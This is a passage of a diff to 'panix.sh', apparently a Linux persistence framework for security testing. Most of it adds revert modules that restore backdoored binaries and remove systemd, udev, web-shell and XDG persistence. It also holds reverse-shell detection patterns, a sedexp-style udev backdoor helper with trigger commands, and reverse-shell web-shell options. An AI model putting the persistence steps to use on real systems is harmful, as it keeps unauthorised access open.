+		binary_path=$(command -v "$binary_name" 2>/dev/null)
+
+		if [[ -z "$binary_path" ]]; then
+			echo "[-] Binary '$binary_name' not found in PATH."
+			return
+		fi
+
+		if [[ -f "${binary_path}.original" ]]; then
+			echo "[+] Restoring original binary for '$binary_name'..."
+			mv -f "${binary_path}.original" "$binary_path"
+			chmod +x "$binary_path"
+			echo "[+] '$binary_name' restored successfully."
+		else
+			echo "[-] Backup for '$binary_name' not found. Skipping."
+		fi
+	}
+
+	# Restore default binaries
+	for bin in "${default_binaries[@]}"; do
+		restore_binary "$bin"
+	done
+
+	# Check for any custom backdoored binaries
+	# This assumes that any binary with a '.original' backup was backdoored
+	echo "[+] Searching for custom backdoored binaries..."
+	find / -type f -name "*.original" 2>/dev/null | while read -r backup_file; do
+		original_file="${backup_file%.original}"
+		if [[ -f "$original_file" ]]; then
+			echo "[+] Restoring custom binary '$original_file'..."
+			mv -f "$backup_file" "$original_file"
+			chmod +x "$original_file"
+			echo "[+] '$original_file' restored successfully."
+		fi
+	done
+
+	return 0
+}
+
 # Module: setup_systemd.sh
 setup_systemd() {
 	local service_path=""
@@ -3993,6 +6234,7 @@ setup_systemd() {
 		echo "  --path <path>                Specify custom service path (must end with .service)"
 		echo "  --command <command>          Specify custom persistence command (no validation)"
 		echo "  --timer                      Create systemd timer (1 minute interval)"
+		echo "--help|-h                    Show this help message"
 	}
 
 	while [[ "$1" != "" ]]; do
@@ -4216,6 +6458,145 @@ setup_systemd() {
 	echo "[+] Systemd service persistence established!"
 }
 
+# Revert Module: revert_systemd.sh
+revert_systemd() {
+    usage_revert_systemd() {
+        echo "Usage: ./panix.sh --revert systemd"
+        echo "Reverts any changes made by the setup_systemd module."
+    }
+
+    if ! check_root; then
+        echo "Error: This function can only be run as root."
+        return 1
+    fi
+
+    # Revert default services
+    default_service_name="dbus-org.freedesktop.resolved.service"
+    default_timer_name="dbus-org.freedesktop.resolved.timer"
+    default_system_service_path="/usr/local/lib/systemd/system/$default_service_name"
+    default_system_timer_path="/usr/local/lib/systemd/system/$default_timer_name"
+
+    # Disable and stop the default system-level timer and service
+    if [[ -f "$default_system_service_path" || -f "$default_system_timer_path" ]]; then
+        echo "[+] Disabling and stopping default system-level systemd services..."
+
+        systemctl stop "$default_timer_name" 2>/dev/null
+        systemctl disable "$default_timer_name" 2>/dev/null
+
+        systemctl stop "$default_service_name" 2>/dev/null
+        systemctl disable "$default_service_name" 2>/dev/null
+
+        # Remove the service and timer files
+        rm -f "$default_system_service_path" "$default_system_timer_path"
+
+        echo "[+] Removed default system-level systemd service and timer files."
+    else
+        echo "[-] Default system-level systemd service and timer files not found."
+    fi
+
+    # Revert default user-level services
+    for user_home in /home/*; do
+        if [ -d "$user_home/.config/systemd/user" ]; then
+            user_service_path="$user_home/.config/systemd/user/$default_service_name"
+            user_timer_path="$user_home/.config/systemd/user/$default_timer_name"
+            user_name=$(basename "$user_home")
+
+            if [[ -f "$user_service_path" || -f "$user_timer_path" ]]; then
+                echo "[+] Disabling and stopping default user-level systemd services for user '$user_name'..."
+
+                su - "$user_name" -c "systemctl --user stop '$default_timer_name'" 2>/dev/null
+                su - "$user_name" -c "systemctl --user disable '$default_timer_name'" 2>/dev/null
+
+                su - "$user_name" -c "systemctl --user stop '$default_service_name'" 2>/dev/null
+                su - "$user_name" -c "systemctl --user disable '$default_service_name'" 2>/dev/null
+
+                # Remove the service and timer files
+                rm -f "$user_service_path" "$user_timer_path"
+
+                echo "[+] Removed default user-level systemd service and timer files for user '$user_name'."
+            else
+                echo "[-] Default user-level systemd service and timer files not found for user '$user_name'."
+            fi
+        fi
+    done
+
+    # Reload systemd daemon
+    systemctl daemon-reload
+
+    # For each user, reload the user systemd daemon
+    for user_home in /home/*; do
+        if [ -d "$user_home/.config/systemd/user" ]; then
+            user_name=$(basename "$user_home")
+            su - "$user_name" -c "systemctl --user daemon-reload" 2>/dev/null
+        fi
+    done
+
+    # Attempt to detect and remove custom malicious services
+    echo "[+] Searching for custom malicious systemd services..."
+
+    # Define directories to search for malicious services
+    service_dirs=(
+        "/usr/local/lib/systemd/system"
+        "/etc/systemd/system"
+    )
+
+    # Search for suspicious system-level services
+    for dir in "${service_dirs[@]}"; do
+        if [ -d "$dir" ]; then
+            find "$dir" -type f -name "*.service" -o -name "*.timer" 2>/dev/null | while read -r service_file; do
+                # Check if the service file contains suspicious commands
+                if grep -Eq "(bash -i >& /dev/tcp|ExecStart=.*bash -c)" "$service_file"; then
+                    service_name=$(basename "$service_file")
+                    echo "[+] Found suspicious system-level service: '$service_name'"
+
+                    # Disable and stop the service
+                    systemctl stop "$service_name" 2>/dev/null
+                    systemctl disable "$service_name" 2>/dev/null
+
+                    # Remove the service file
+                    rm -f "$service_file"
+
+                    echo "[+] Removed suspicious system-level service: '$service_name'"
+                fi
+            done
+        fi
+    done
+
+    # Search for suspicious user-level services
+    for user_home in /home/*; do
+        if [ -d "$user_home/.config/systemd/user" ]; then
+            user_name=$(basename "$user_home")
+            find "$user_home/.config/systemd/user/" -type f -name "*.service" -o -name "*.timer" 2>/dev/null | while read -r service_file; do
+                if grep -Eq "(bash -i >& /dev/tcp|ExecStart=.*bash -c)" "$service_file"; then
+                    service_name=$(basename "$service_file")
+                    echo "[+] Found suspicious user-level service for user '$user_name': '$service_name'"
+
+                    # Disable and stop the service
+                    su - "$user_name" -c "systemctl --user stop '$service_name'" 2>/dev/null
+                    su - "$user_name" -c "systemctl --user disable '$service_name'" 2>/dev/null
+
+                    # Remove the service file
+                    rm -f "$service_file"
+
+                    echo "[+] Removed suspicious user-level service for user '$user_name': '$service_name'"
+                fi
+            done
+        fi
+    done
+
+    # Reload daemons again
+    systemctl daemon-reload
+
+    for user_home in /home/*; do
+        if [ -d "$user_home/.config/systemd/user" ]; then
+            user_name=$(basename "$user_home")
+            su - "$user_name" -c "systemctl --user daemon-reload" 2>/dev/null
+        fi
+    done
+
+    return 0
+}
+
 # Module: setup_udev.sh
 setup_udev() {
 	local default=0
@@ -4241,6 +6622,7 @@ setup_udev() {
 		echo "--custom                                Use custom udev settings"
 		echo "  --command <command>                     Specify custom command"
 		echo "  --path <path>                           Specify custom path"
+		echo "--help|-h                               Show this help message"
 	}
 
 	while [[ "$1" != "" ]]; do
@@ -4309,7 +6691,7 @@ setup_udev() {
 				# Reference: https://www.aon.com/en/insights/cyber-labs/unveiling-sedexp
 
 				# Create a helper program to bypass network restrictions
-				cat <<-EOF > /usr/bin/sedexp
+				cat <<-EOF > /bin/sedexp
 				#!/bin/bash
 				while true; do
 					if [ -f /tmp/sedexp ]; then
@@ -4327,8 +6709,19 @@ setup_udev() {
 
 				# Create a more widely supported sedexp udev rules file based on Sedexp malware
 				cat <<-EOF > /etc/udev/rules.d/10-sedexp.rules
-				ACTION=="add", KERNEL=="random", RUN+="/usr/bin/touch /tmp/sedexp"
+				ACTION=="add", KERNEL=="random", RUN+="/bin/touch /tmp/sedexp"
 				EOF
+
+				echo "[!] This mechanism is not persistent across reboots."
+				echo "[!] Consider using --at, --cron, or --systemd for persistence."
+				echo "[!] This technique is just here to mimic the sedexp behavior."
+				echo ""
+				echo "[!] Note: This utility launches when a random device is added to the system."
+				echo "[!] You can trigger this backdoor by running:"
+				echo ""
+				echo "sudo mknod /dev/random c 1 8"
+				echo "sudo udevadm trigger --action=add --name-match=random"
+				echo ""
 				;;
 
 			--at )
@@ -4414,6 +6807,108 @@ setup_udev() {
 	echo "[+] Udev persistence established."
 }
 
+# Revert Module: revert_udev.sh
+revert_udev() {
+	usage_revert_udev() {
+		echo "Usage: ./panix.sh --revert udev"
+		echo "Reverts any changes made by the setup_udev module."
+	}
+
+	if ! check_root; then
+		echo "Error: This function can only be run as root."
+		return 1
+	fi
+
+	# Function to remove a file if it exists
+	remove_file() {
+		local file_path="$1"
+		if [[ -f "$file_path" ]]; then
+			rm -f "$file_path"
+			echo "[+] Removed file: $file_path"
+		fi
+	}
+
+	# Function to remove a udev rule
+	remove_udev_rule() {
+		local rule_name="$1"
+		local rule_path="/etc/udev/rules.d/$rule_name"
+		remove_file "$rule_path"
+	}
+
+	# Function to remove a script from /usr/bin or /bin
+	remove_script() {
+		local script_name="$1"
+		remove_file "/usr/bin/$script_name"
+		remove_file "/bin/$script_name"
+	}
+
+	# Function to stop and disable a systemd service
+	remove_systemd_service() {
+		local service_name="$1"
+		local service_path="/etc/systemd/system/$service_name.service"
+
+		if systemctl is-active --quiet "$service_name"; then
+			systemctl stop "$service_name"
+			echo "[+] Stopped systemd service: $service_name"
+		else
+			echo "[-] Systemd service not running: $service_name"
+		fi
+
+		if systemctl is-enabled --quiet "$service_name"; then
+			systemctl disable "$service_name"
+			echo "[+] Disabled systemd service: $service_name"
+		else
+			echo "[-] Systemd service not enabled: $service_name"
+		fi
+
+		remove_file "$service_path"
+	}
+
+	# Function to remove a cron job containing a specific string
+	remove_cron_job() {
+		local job_string="$1"
+		crontab -l | grep -v "$job_string" | crontab -
+		echo "[+] Removed cron jobs containing: $job_string"
+	}
+
+	# Remove udev rules and associated scripts
+	echo "[+] Removing udev rules and associated scripts..."
+
+	# Remove sedexp components
+	remove_script "sedexp"
+	remove_udev_rule "10-sedexp.rules"
+	remove_file "/tmp/sedexp"
+
+	# Remove atest components
+	remove_script "atest"
+	remove_udev_rule "11-atest.rules"
+
+	# Remove crontest components
+	remove_script "crontest"
+	remove_udev_rule "11-crontest.rules"
+	remove_cron_job "/usr/bin/crontest"
+
+	# Remove systemdtest components
+	remove_systemd_service "systemdtest"
+	remove_udev_rule "12-systemdtest.rules"
+
+	# Remove any custom udev rules added by the setup function
+	# Assuming custom rules are stored with names starting with "10-backdoor.rules"
+	for custom_rule in /etc/udev/rules.d/10-backdoor.rules; do
+		if [[ -f "$custom_rule" ]]; then
+			remove_file "$custom_rule"
+		fi
+	done
+
+	# Reload udev rules
+	echo "[+] Reloading udev rules..."
+	udevadm control --reload
+	udevadm trigger
+	echo "[+] Udev rules reloaded."
+
+	return 0
+}
+
 # Module: setup_web_shell.sh
 setup_web_shell() {
 	local port=""
@@ -4424,13 +6919,13 @@ setup_web_shell() {
 
 	usage_web_shell() {
 		echo "Usage: ./panix.sh --web-shell [OPTIONS]"
-		echo "  --mechanism <cmd|reverse>             Specify mechanism (cmd for command execution, reverse for reverse shell)"
-		echo "  --language <php|python>               Specify language for the web server"
-		echo "  --port <port>                         Specify port for the web server"
+		echo "--language <php|python>               Specify language for the web server"
+		echo "--port <port>                         Specify port for the web server"
+		echo "--mechanism <cmd|reverse>             Specify mechanism (cmd for command execution, reverse for reverse shell)"
 		echo "  --rev-port <port>                     Specify port for the reverse shell"
-		echo "  --ip <ip>                             Required for reverse mechanism, specify the attacker's IP"
-		echo "  --examples                            Display command examples"
-		echo "  --help|-h                             Show this help message"
+		echo "  --ip <ip>                             Specify IP for the reverse shell"
+		echo "--examples                            Display command examples"
+		echo "--help|-h                             Show this help message"
 	}
 
 	while [[ "$1" != "" ]]; do
@@ -4597,6 +7092,138 @@ EOF
 			echo "[-] Error: Unsupported language specified. Use php or python."
 			exit 1
 	esac
+
+    echo "[!] In case you cannot connect, ensure your firewall settings are allowing inbound traffic on port $port."
+    echo "Run the following commands in case of issues on RHEL/CentOS systems:"
+    echo ""
+    echo "sudo firewall-cmd --add-port=8080/tcp --permanent"
+    echo "sudo firewall-cmd --reload"
+}
+
+# Revert Module: revert_web_shell.sh
+revert_web_shell() {
+    usage_revert_web_shell() {
+        echo "Usage: ./panix.sh --revert web-shell"
+        echo "Reverts any changes made by the setup_web_shell module."
+    }
+
+    # Determine if the script is run as root
+    if [[ "$(id -u)" -eq 0 ]]; then
+        is_root=true
+    else
+        is_root=false
+    fi
+
+    # Function to display usage if needed
+    if [[ "$1" == "--help" || "$1" == "-h" ]]; then
+        usage_revert_web_shell
+        return 0
+    fi
+
+    # Define system users to skip (modify this array if certain users should not be processed)
+    system_users=("root" "daemon" "bin" "sys" "sync" "games" "man" "lp" "mail" "news" "uucp" "proxy" "www-data" "backup" "list" "irc" "gnats" "nobody" "systemd-network" "systemd-resolve" "syslog" "messagebus" "uuidd" "dnsmasq" "usbmux" "rtkit" "cups-pk-helper" "dnsmasq-dhcp" "sshd" "polkitd")
+
+    # Function to check if a user is a system user
+    is_system_user() {
+        local user="$1"
+        for sys_user in "${system_users[@]}"; do
+            if [[ "$user" == "$sys_user" ]]; then
+                return 0
+            fi
+        done
+        return 1
+    }
+
+    # Function to determine web server directory based on user privileges
+    determine_web_dir() {
+        local user="$1"
+        if [[ "$user" == "root" ]]; then
+            echo "/var/www/html/panix/"
+        else
+            echo "$HOME/panix/"
+        fi
+    }
+
+    # Function to find and kill web server processes serving a specific directory
+    kill_web_server_processes() {
+        local web_dir="$1"
+
+        echo "[+] Identifying web server processes serving $web_dir..."
+
+        # Find PIDs of php -S processes serving the web_dir
+        php_pids=$(ps aux | grep "[p]hp -S" | grep "$web_dir" | awk '{print $2}')
+
+        # Find PIDs of python3 -m http.server or python -m CGIHTTPServer serving the web_dir
+        python3_pids=$(ps aux | grep "[p]ython3 -m http.server" | grep "$web_dir" | awk '{print $2}')
+        python_pids=$(ps aux | grep "[p]ython -m CGIHTTPServer" | grep "$web_dir" | awk '{print $2}')
+
+        all_pids="$php_pids $python3_pids $python_pids"
+
+        if [[ -z "$all_pids" ]]; then
+            echo "[-] No web server processes found serving $web_dir."
+        else
+            for pid in $all_pids; do
+                kill -9 "$pid" && echo "[+] Killed process $pid serving $web_dir."
+            done
+        fi
+    }
+
+    # Function to remove the web server directory
+    remove_web_dir() {
+        local web_dir="$1"
+        if [[ -d "$web_dir" ]]; then
+            rm -rf "$web_dir"
+            if [[ $? -eq 0 ]]; then
+                echo "[+] Removed web server directory: $web_dir"
+            else
+                echo "[-] Failed to remove web server directory: $web_dir"
+            fi
+        else
+            echo "[-] Web server directory not found: $web_dir. Skipping removal."
+        fi
+    }
+
+    # Function to revert web shells for a single user
+    revert_user_web_shell() {
+        local user="$1"
+        local web_dir=$(determine_web_dir "$user")
+
+        echo "[+] Reverting web shell for user '$user' at: $web_dir"
+
+        # Kill web server processes
+        kill_web_server_processes "$web_dir"
+
+        # Remove web server directory
+        remove_web_dir "$web_dir"
+    }
+
+    # Main revert logic based on execution context
+    if [[ "$is_root" == true ]]; then
+        echo "[+] Running as root. Reverting web shells for root and all non-system users."
+
+        # Revert web shell for root
+        revert_user_web_shell "root"
+
+        # Iterate over all user directories in /home
+        for user_home in /home/*; do
+            if [[ -d "$user_home" ]]; then
+                user_name=$(basename "$user_home")
+                if is_system_user "$user_name"; then
+                    echo "[-] Skipping system user '$user_name'."
+                    continue
+                fi
+                revert_user_web_shell "$user_name"
+            fi
+        done
+    else
+        # Non-root execution: revert web shell for the current user only
+        current_user=$(whoami)
+        echo "[+] Running as non-root. Reverting web shell for user '$current_user'."
+
+        revert_user_web_shell "$current_user"
+    fi
+
+    return 0
 }
 
 # Module: setup_xdg.sh
@@ -4614,6 +7241,7 @@ setup_xdg() {
 		echo "--custom                     Use custom xdg settings (make sure they are valid!)"
 		echo "  --path <path>                Specify custom desktop entry path"
 		echo "  --command <command>          Specify custom persistence command"
+		echo "--help|-h                             Show this help message"
 	}
 
 	local profile_path=""
@@ -4726,325 +7354,238 @@ setup_xdg() {
 	echo "[+] XDG persistence established!"
 }
 
-revert_changes() {
-	local current_user=$(whoami)
-	local ssh_dir="/home/$current_user/.ssh"
-	local is_root=false
-	local in_docker_group=false
-	local malicious_entry="/dev/tcp"
+# Revert Module: revert_xdg.sh
+revert_xdg() {
+	usage_revert_xdg() {
+		echo "Usage: ./panix.sh --revert xdg"
+		echo "Reverts any changes made by the setup_xdg module."
+	}
 
-	# Check if running as root
-	if [ "$(id -u)" -eq 0 ]; then
+	# Determine if the script is run as root
+	if [[ "$(id -u)" -eq 0 ]]; then
 		is_root=true
-	fi
-
-	# Check if the user is in the docker group
-	if groups $current_user | grep -q '\bdocker\b'; then
-		in_docker_group=true
-	fi
-
-	if $is_root; then
-		echo "[*] Running as root..."
 	else
-		echo "[*] Running as user..."
+		is_root=false
 	fi
 
-	# Systemd
-	echo "[*] Cleaning Systemd persistence methods..."
-	if $is_root; then
-		systemctl stop dbus-org.freedesktop.resolved.service dbus-org.freedesktop.resolved.timer 2>/dev/null
-		systemctl disable dbus-org.freedesktop.resolved.service dbus-org.freedesktop.resolved.timer 2>/dev/null
-		rm -f /usr/local/lib/systemd/system/dbus-org.freedesktop.resolved.service
-		rm -f /usr/local/lib/systemd/system/dbus-org.freedesktop.resolved.timer
+	# Function to display usage if needed
+	if [[ "$1" == "--help" || "$1" == "-h" ]]; then
+		usage_revert_xdg_backdoor
+		return 0
 	fi
-	rm -f /home/$current_user/.config/systemd/user/dbus-org.freedesktop.resolved.service
-	rm -f /home/$current_user/.config/systemd/user/dbus-org.freedesktop.resolved.timer
-	if ! $is_root; then
-		systemctl --user stop dbus-org.freedesktop.resolved.service dbus-org.freedesktop.resolved.timer 2>/dev/null
-		systemctl --user disable dbus-org.freedesktop.resolved.service dbus-org.freedesktop.resolved.timer 2>/dev/null
-	fi
-	echo "[+] Successfully cleaned persistence method Systemd"
 
-	# Systemd Generator
-	echo "[*] Cleaning Systemd Generator persistence methods..."
-	if $is_root; then
-		systemctl stop generator.service 2>/dev/null
-		systemctl disable generator.service 2>/dev/null
-		rm -f /usr/lib/systemd/system-generators/makecon
-		rm -f /usr/lib/systemd/system-generators/generator
-		rm -f /run/systemd/system/generator.service
-		rm -f /run/systemd/system/multi-user.target.wants/generator.service
-	else
-		systemctl --user stop generator.service 2>/dev/null
-		systemctl --user disable generator.service 2>/dev/null
-	fi
-	echo "[+] Successfully cleaned persistence method Systemd Generator"
+	# Define system users to skip (modify this array if certain users should not be processed)
+	system_users=("root" "daemon" "bin" "sys" "sync" "games" "man" "lp" "mail" "news" "uucp" "proxy" "www-data" "backup" "list" "irc" "gnats" "nobody" "systemd-network" "systemd-resolve" "syslog" "messagebus" "uuidd" "dnsmasq" "usbmux" "rtkit" "cups-pk-helper" "dnsmasq-dhcp" "sshd" "polkitd")
 
-	# Cron
-	echo "[*] Cleaning Cron persistence methods..."
-	if $is_root; then
-		rm -f /etc/cron.d/freedesktop_timesync1
-		for file in /etc/cron*; do
-			[ -e "$file" ] && sed -i "/$malicious_entry/ d" $file 2>/dev/null
+	# Function to check if a user is a system user
+	is_system_user() {
+		local user="$1"
+		for sys_user in "${system_users[@]}"; do
+			if [[ "$user" == "$sys_user" ]]; then
+				return 0
+			fi
 		done
-	fi
-	crontab -l | grep -v "$malicious_entry" | crontab -
-	echo "[+] Successfully cleaned persistence method Cron"
+		return 1
+	}
 
-	# At
-	echo "[*] Cleaning At persistence methods..."
-	if $is_root; then
-		for file in /var/spool/cron/atjobs/*; do
-			[ -e "$file" ] && sed -i "/$malicious_entry/ d" $file 2>/dev/null
-		done
-	fi
-	echo "[+] Successfully cleaned persistence method At"
+	# Function to determine xdg directory based on user privileges
+	determine_xdg_dir() {
+		local user="$1"
+		if [[ "$user" == "root" ]]; then
+			echo "/etc/xdg/autostart/"
+		else
+			echo "/home/$user/.config/autostart/"
+		fi
+	}
 
-	# Shell profile
-	echo "[*] Cleaning Shell profile persistence methods..."
-	if $is_root; then
-		[ -e "/etc/profile" ] && sed -i "/$malicious_entry/ d" /etc/profile 2>/dev/null
-	fi
-	[ -e "/home/$current_user/.bash_profile" ] && sed -i "/$malicious_entry/ d" /home/$current_user/.bash_profile 2>/dev/null
-	echo "[+] Successfully cleaned persistence method Shell profile"
+	# Function to backup a file if not already backed up
+	backup_file() {
+		local file_path="$1"
+		if [[ -f "$file_path" && ! -f "${file_path}.backup" ]]; then
+			cp "$file_path" "${file_path}.backup"
+			echo "[+] Backup of $file_path created at ${file_path}.backup"
+		elif [[ -f "$file_path" && -f "${file_path}.backup" ]]; then
+			echo "[+] Backup of $file_path already exists at ${file_path}.backup"
+		else
+			echo "[-] File not found: $file_path. Skipping backup."
+		fi
+	}
 
-	# XDG
-	echo "[*] Cleaning XDG persistence methods..."
-	if $is_root; then
-		rm -f /etc/xdg/autostart/pkc12-register.desktop
-		rm -f /etc/xdg/pkc12-register
-	fi
-	rm -f /home/$current_user/.config/autostart/user-dirs.desktop
-	rm -f /home/$current_user/.config/autostart/.user-dirs
-	echo "[+] Successfully cleaned persistence method XDG"
+	# Function to remove the XDG backdoor desktop entry and associated command script
+	remove_xdg_backdoor() {
+		local user="$1"
+		local xdg_dir=$(determine_xdg_dir "$user")
+		local desktop_entry=""
+		local command_script=""
 
-	# SSH
-	echo "[*] Cleaning SSH persistence methods..."
-	rm -f $ssh_dir/id_rsa1822
-	rm -f $ssh_dir/id_rsa1822.pub
-	echo "[+] Successfully cleaned persistence method SSH"
+		echo "[+] Reverting XDG backdoor for user '$user' at: $xdg_dir"
 
-	# Sudoers
-	echo "[*] Cleaning Sudoers persistence methods..."
-	if $is_root; then
-		rm -f /etc/sudoers.d/$current_user
-	fi
-	echo "[+] Successfully cleaned persistence method Sudoers"
+		# Remove default desktop entries and scripts
+		if [[ "$is_root" == true && "$user" == "root" ]]; then
+			desktop_entry="/etc/xdg/autostart/pkc12-register.desktop"
+			command_script="/etc/xdg/pkc12-register"
+		elif [[ "$is_root" == false && "$user" != "root" ]]; then
+			desktop_entry="/home/$user/.config/autostart/user-dirs.desktop"
+			command_script="/home/$user/.config/autostart/.user-dirs"
+		fi
 
-	# Setuid
-	echo "[*] Cleaning Setuid persistence methods..."
-	if $is_root; then
-		for bin in find dash python python3; do
-			[ -e "$(which $bin)" ] && chmod u-s $(which $bin) 2>/dev/null
-		done
-	fi
-	echo "[+] Successfully cleaned persistence method Setuid"
-
-	# MOTD
-	echo "[*] Cleaning MOTD persistence methods..."
-	if $is_root; then
-		rm -f /etc/update-motd.d/137-python-upgrades
-		for file in /etc/update-motd.d/*; do
-			[ -e "$file" ] && sed -i "/$malicious_entry/ d" $file 2>/dev/null
-		done
-	fi
-	echo "[+] Successfully cleaned persistence method MOTD"
-
-	# rc.local
-	echo "[*] Cleaning rc.local persistence methods..."
-	if $is_root; then
-		[ -e "/etc/rc.local" ] && sed -i "/$malicious_entry/ d" /etc/rc.local 2>/dev/null
-	fi
-	echo "[+] Successfully cleaned persistence method rc.local"
-
-	# initd
-	echo "[*] Cleaning initd persistence methods..."
-	if $is_root; then
-		rm -f /etc/init.d/ssh-procps
-	fi
-	echo "[+] Successfully cleaned persistence method initd"
-
-	# Package Managers
-	echo "[*] Cleaning Package Managers persistence methods..."
-	if $is_root; then
-		rm -f /etc/apt/apt.conf.d/01python-upgrades
-		rm -f /usr/lib/yumcon
-		rm -f /usr/lib/yum-plugins/yumcon.py
-		rm -f /etc/yum/pluginconf.d/yumcon.conf
-		local python_version=$(ls /usr/lib | grep -oP 'python3\.\d+' | head -n 1)
-		[ -n "$python_version" ] && rm -f /usr/lib/$python_version/site-packages/dnfcon
-		rm -f /etc/dnf/plugins/dnfcon.conf
-		[ -n "$python_version" ] && rm -f /usr/lib/$python_version/site-packages/dnf-plugins/dnfcon.py
-	fi
-	echo "[+] Successfully cleaned persistence method Package Managers"
-
-	# setcap
-	echo "[*] Cleaning setcap persistence methods..."
-	if $is_root; then
-		for bin in perl ruby php python python3 node; do
-			[ -e "$(which $bin)" ] && setcap -r $(which $bin) 2>/dev/null
-		done
-	fi
-	echo "[+] Successfully cleaned persistence method setcap"
-
-	# Bind shell
-	echo "[*] Cleaning Bind shell persistence methods..."
-	if $is_root; then
-		pkill -f /tmp/bd86 2>/dev/null
-		pkill -f /tmp/bd64 2>/dev/null
-	fi
-	rm -f /tmp/bd86
-	rm -f /tmp/bd64
-	echo "[+] Successfully cleaned persistence method Bind shell"
-
-	# Backdoor binaries
-	echo "[*] Cleaning Backdoor binaries persistence methods..."
-	if $is_root; then
-		for binary in cat ls; do
-			original=$(which $binary).original
-			if [ -f "$original" ]; then
-				mv "$original" "$(which $binary)" 2>/dev/null
-				if [ $? -eq 0 ]; then
-					echo "[+] Successfully restored $binary binary"
+		# Remove default desktop entry and script
+		if [[ -n "$desktop_entry" ]]; then
+			if [[ -f "$desktop_entry" ]]; then
+				backup_file "$desktop_entry"
+				rm -f "$desktop_entry"
+				if [[ $? -eq 0 ]]; then
+					echo "[+] Removed desktop entry: $desktop_entry"
 				else
-					echo "[-] Failed to restore $binary binary"
+					echo "[-] Failed to remove desktop entry: $desktop_entry"
 				fi
 			else
-				echo "[*] No original file for $binary found, skipping..."
+				echo "[-] Desktop entry not found: $desktop_entry. Skipping."
+			fi
+		fi
+
+		if [[ -n "$command_script" ]]; then
+			if [[ -f "$command_script" ]]; then
+				backup_file "$command_script"
+				rm -f "$command_script"
+				if [[ $? -eq 0 ]]; then
+					echo "[+] Removed command script: $command_script"
+				else
+					echo "[-] Failed to remove command script: $command_script"
+				fi
+			else
+				echo "[-] Command script not found: $command_script. Skipping."
+			fi
+		fi
+
+		# Scan for any custom desktop entries that match the malicious pattern
+		echo "[+] Scanning for custom XDG backdoors in $xdg_dir"
+		for desktop_file in "$xdg_dir"*.desktop; do
+			if [[ -f "$desktop_file" ]]; then
+				# Extract the Exec line
+				exec_line=$(grep -E "^Exec=" "$desktop_file" | cut -d'=' -f2-)
+				# Check if the Exec line contains the malicious command pattern
+				if echo "$exec_line" | grep -q "sh -i >& /dev/tcp/"; then
+					echo "[+] Identified malicious desktop entry: $desktop_file"
+					backup_file "$desktop_file"
+					rm -f "$desktop_file"
+					if [[ $? -eq 0 ]]; then
+						echo "[+] Removed malicious desktop entry: $desktop_file"
+					else
+						echo "[-] Failed to remove malicious desktop entry: $desktop_file"
+					fi
+
+					# Extract the command script path from Exec line
+					# Assuming Exec points to the command script directly
+					command_script_path="$exec_line"
+					if [[ -f "$command_script_path" ]]; then
+						backup_file "$command_script_path"
+						rm -f "$command_script_path"
+						if [[ $? -eq 0 ]]; then
+							echo "[+] Removed malicious command script: $command_script_path"
+						else
+							echo "[-] Failed to remove malicious command script: $command_script_path"
+						fi
+					else
+						echo "[-] Command script not found: $command_script_path. Skipping."
+					fi
+				else
+					echo "[-] No malicious pattern found in Exec line of: $desktop_file. Skipping."
+				fi
 			fi
 		done
-	fi
-	echo "[+] Successfully cleaned persistence method Backdoor binaries"
+	}
 
-	# udev
-	echo "[*] Cleaning udev persistence methods..."
-	if $is_root; then
-		rm -f /usr/bin/atest
-		rm -f /etc/udev/rules.d/10-atest.rules
-		rm -f /usr/bin/crontest
-		rm -f /etc/udev/rules.d/11-crontest.rules
-		rm -f /etc/udev/rules.d/12-systemdtest.rules
-		systemctl stop systemdtest.service 2>/dev/null
-		systemctl disable systemdtest.service 2>/dev/null
-		rm -f /etc/systemd/system/systemdtest.service
-	fi
-	echo "[+] Successfully cleaned persistence method udev"
+	# Function to revert backdoors for a single user
+	revert_user_xdg_backdoor() {
+		local user="$1"
+		remove_xdg_backdoor "$user"
+	}
 
-	# Git
-	echo "[*] Cleaning Git persistence methods..."
-	local repos=$(find / -name ".git" -type d 2>/dev/null)
+	# Main revert logic based on execution context
+	if [[ "$is_root" == true ]]; then
+		echo "[+] Running as root. Reverting XDG backdoors for root and all non-system users."
 
-	if [[ -z $repos ]]; then
-		echo "[-] No Git repositories found."
+		# Revert XDG backdoor for root
+		revert_user_xdg_backdoor "root"
+
+		# Iterate over all user directories in /home
+		for user_home in /home/*; do
+			if [[ -d "$user_home" ]]; then
+				user_name=$(basename "$user_home")
+				if is_system_user "$user_name"; then
+					echo "[-] Skipping system user '$user_name'."
+					continue
+				fi
+				revert_user_xdg_backdoor "$user_name"
+			fi
+		done
 	else
-		for repo in $repos; do
-			local git_repo=$(dirname $repo)
-			local pre_commit_file="$git_repo/.git/hooks/pre-commit"
-			local git_config="$git_repo/.git/config"
-			local user_git_config="/home/$current_user/.gitconfig"
+		# Non-root execution: revert XDG backdoor for the current user only
+		current_user=$(whoami)
+		echo "[+] Running as non-root. Reverting XDG backdoor for user '$current_user'."
 
-			# Remove malicious pre-commit hook
-			if [[ -f $pre_commit_file ]]; then
-				if grep -q "$malicious_entry" $pre_commit_file; then
-					sed -i "/$malicious_entry/ d" $pre_commit_file
-					echo "[+] Removed malicious entry from pre-commit hook in $git_repo"
-				fi
-			fi
-
-			# Remove malicious pager configuration from repo config
-			if [[ -f $git_config ]]; then
-				if grep -q "$malicious_entry" $git_config; then
-					sed -i "/$malicious_entry/ d" $git_config
-					echo "[+] Removed malicious pager from Git config in $git_repo"
-				fi
-			fi
-
-			# Remove malicious pager configuration from global config
-			if [[ -f $user_git_config ]]; then
-				if grep -q "$malicious_entry" $user_git_config; then
-					sed -i "/$malicious_entry/ d" $user_git_config
-					echo "[+] Removed malicious pager from global Git config"
-				fi
-			fi
-		done
+		revert_user_xdg_backdoor "$current_user"
 	fi
-	echo "[+] Successfully cleaned persistence method Git"
 
-	# Docker
-	echo "[*] Cleaning Docker persistence methods..."
-	if $is_root || $in_docker_group; then
-		rm -f /tmp/Dockerfile
-		docker stop malicious-container 2>/dev/null
-		docker rm malicious-container 2>/dev/null
-	fi
-	echo "[+] Successfully cleaned persistence method Docker"
-
-	# Malicious package
-	echo "[*] Cleaning Malicious package persistence methods..."
-	if $is_root; then
-		rm -f /var/lib/rpm/panix.rpm
-		rm -f /var/lib/dpkg/info/panix.postinst
-		sed -i '/panix.rpm/ d' /var/spool/cron/$current_user
-		sed -i '/panix.postinst/ d' /var/spool/cron/crontabs/$current_user
-	fi
-	echo "[+] Successfully cleaned persistence method Malicious package"
+	return 0
 }
 
 display_mitre_matrix() {
-    echo -e "\n\033[1;34mMITRE ATT&CK Matrix - Persistence Techniques Supported by PANIX\033[0m\n"
